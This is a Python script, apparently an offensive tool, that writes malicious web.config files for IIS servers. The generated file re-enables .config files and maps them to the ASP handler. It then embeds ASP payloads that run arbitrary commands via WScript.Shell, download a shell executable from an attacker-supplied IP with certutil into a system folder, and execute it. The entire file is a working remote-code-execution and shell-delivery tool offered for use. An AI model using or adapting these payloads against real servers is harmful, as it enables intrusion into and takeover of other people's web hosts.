#!/usr/bin/env python

import sys
import pyfiglet

base_payload = """<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
"""

payload_math = """<!-- ASP.NET code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
"""

payload_whoami = """<!-- ASP.NET code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->"""


payload_cmd = """<!-- ASP.NET code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("{}")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->"""

payload_file_upload = """<!-- ASP.NET code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("certutil -urlcache -split -f http://{0}/{1} C:\Windows\System32\spool\drivers\color\\{1}")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
"""

payload_file_execute = """<!-- ASP.NET code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\System32\spool\drivers\color\\{}")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
"""


def file_writer(payload):
	with open("web.config", "w") as f:
		f.write(payload)


def help_menu():
   print "--test-exec      : Testing with simple math calculation if there is a code execution"
   print "--test-cmd       : python {} <command>   --> Testing with simple command if there is a code execution".format(sys.argv[0])
   print "--test-whoami    : python {} whoami      --> Testing with simple whoami command if there is a code execution".format(sys.argv[0])
   print "--shell-upload   : python {} <IP-addr> <file_name> --> Trying upload shell".format(sys.argv[0])
   print "--shell-exec     : python {} <file_name> --> Trying shell execute".format(sys.argv[0])
   print "--custom-exec    : python {} <command>   --> Try execute custom command".format(sys.argv[0])
   print "--show-config    : Showing web.config base template"
   print """--show-payload : python {} --show-payload <payload_name>
      --show-payload payload_cmd
      --show-payload payload_whoami
      --show-payload payload_math
      --show-payload payload_file_upload
      --show-payload payload_file_execute""".format(sys.argv[0])
   exit()

def arg_check():
   if len(sys.argv) < 3:
      help_menu()

def main():
   ascii_banner = pyfiglet.figlet_format("""Simple web.config payload creation tool""")
   print ascii_banner

   if len(sys.argv) == 1:
      help_menu()

   payload = ""
   if sys.argv[1] == "--test-exec":
      payload += base_payload + payload_math
      file_writer(payload)
      exit()

   elif sys.argv[1] == "--test-whoami":
      payload += base_payload + payload_whoami
      file_writer(payload)
      exit()

   elif sys.argv[1] == "--show-config":
      payload = base_payload
      print payload
      exit()

   arg_check()
   if sys.argv[1] == "--test-cmd":
      if sys.argv[2] != "":
         payload += base_payload + payload_cmd.format(sys.argv[2])
         file_writer(payload)
      exit()

   elif sys.argv[1] == "--shell-upload":
      try:
         if sys.argv[2] != "" and sys.argv[3] != "":
            payload += base_payload + payload_file_upload.format(sys.argv[2], sys.argv[3])
            file_writer(payload)
         else:
            help_menu()
      except:
         print "\r\nUsage: python {} <IP ADDR> <FILE_NAME>\r\n".format(sys.argv[0])
         exit()

   elif sys.argv[1] == "--shell-exec":
      if sys.argv[2] != "":
         payload += base_payload + payload_file_execute.format(sys.argv[2])
         file_writer(payload)
      else:
         help_menu()
   elif sys.argv[1] == "--custom-exec":
      if sys.argv[2] != "":
         payload += base_payload + payload_cmd.format(sys.argv[2])
         file_writer(payload)
      else:
         help_menu()

   elif sys.argv[1] == "--show-payload":
      if sys.argv[2] == "payload_math":
         payload += payload_math
         print(payload)
         exit()

      elif sys.argv[2] == "payload_cmd":
         payload += payload_cmd.format("whoami example")
         print(payload)
         exit()
      elif sys.argv[2] == "payload_whoami":
         payload += payload_whoami
         print(payload)
         exit()
      elif sys.argv[2] == "payload_file_upload":
         payload += payload_file_upload.format("shell.exe")
         print(payload)
         exit()   
      elif sys.argv[2] == "payload_file_execute":
         payload += payload_file_execute.format("shell.exe")
         print(payload)
         exit()
      else:
         help_menu()
   else:
      help_menu()

if __name__ == '__main__':
	main()
